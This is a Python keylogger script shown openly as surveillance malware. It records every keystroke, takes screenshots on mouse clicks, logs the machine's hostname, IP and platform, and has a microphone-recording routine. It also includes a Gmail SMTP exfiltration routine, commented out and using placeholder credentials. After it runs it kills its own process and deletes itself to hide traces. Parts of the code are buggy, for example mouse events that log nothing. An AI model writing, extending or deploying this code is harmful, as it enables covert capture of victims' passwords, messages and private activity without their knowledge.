import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from datetime import datetime
from pynput import keyboard
from pynput.keyboard import Listener

WORK_SPACE_DIR = "C:\\activity"
LOG_DIR = os.path.join(WORK_SPACE_DIR, "logs")
SNAPSHOT_DIR = os.path.join(WORK_SPACE_DIR, "snaps")
SNAPSHOT_LOCATION = os.path.join(SNAPSHOT_DIR, datetime.now().strftime("%Y%b%d"))
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(SNAPSHOT_LOCATION, exist_ok=True)
LOG_FILE_LOCATION = os.path.join(LOG_DIR, "{}.log".format(datetime.now().strftime("%Y%b%d-%H.%M_%S")))

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password
        self.system_information()

    def appendlog(self, string, new_line=False):
        string = "{} \n".format(string) if new_line else string
        self.log = self.log + str(string)
        with open(LOG_FILE_LOCATION, "a+", encoding="utf-8") as f:
            f.write("[{}] {}\n".format(datetime.now().strftime("%Y%b%d-%H.%M_%S"), string))

    def on_move(self, x, y):
        current_move = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_move, new_line=True)

    def on_click(self, x, y):
        current_click = logging.info("Mouse moved to {} {}".format(x, y))
        self.screenshot()
        self.appendlog(current_click, new_line=True)

    def on_scroll(self, x, y):
        current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_scroll, new_line=True)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key, new_line=False)

    def send_mail(self, email, password, message):
        # server = smtplib.SMTP('smtp.gmail.com', 587, message.encode("utf8"))
        # server.starttls()
        # server.login(email, password)
        # server.sendmail(email, email, message)
        # server.quit()
        with open(LOG_FILE_LOCATION, "a", encoding="utf-8") as f:
            f.write("[{}] {}\n".format(datetime.now().strftime("%Y%b%d-%H.%M_%S"), self.log))

    def report(self):
        self.appendlog(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog(platform.uname())
        self.appendlog(hostname)
        self.appendlog(ip)

    def microphone(self):
        fs = 44100
        seconds = 10
        obj = wave.open('sound.wav', 'w')
        obj.setnchannels(1)  # mono
        obj.setsampwidth(2)
        obj.setframerate(fs)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        obj.writeframesraw(myrecording)
        sd.wait()

        self.send_mail(email="MAIL", password="PASSWORD", message=obj)

    def screenshot(self):
        img = pyscreenshot.grab()
        with open(os.path.join(SNAPSHOT_LOCATION, datetime.now().strftime("%Y%b%d-%H.%M_%S.jpeg")), "wb") as f:
            img.save(f)
        # self.send_mail(email="MAIL", password="PASSWORD", message=img)

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()
        if os.name == "nt":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                print('File was closed.')
                os.system("DEL " + os.path.basename(__file__))
            except OSError:
                print('File is close.')

        else:
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system('pkill leafpad')
                os.system("chattr -i " +  os.path.basename(__file__))
                print('File was closed.')
                os.system("rm -rf" + os.path.basename(__file__))
            except OSError:
                print('File is close.')


email_address = "YOUR MAIL"
password = "YOUR PASSWORD"

keylogger = KeyLogger(10, email_address, password)
keylogger.run()
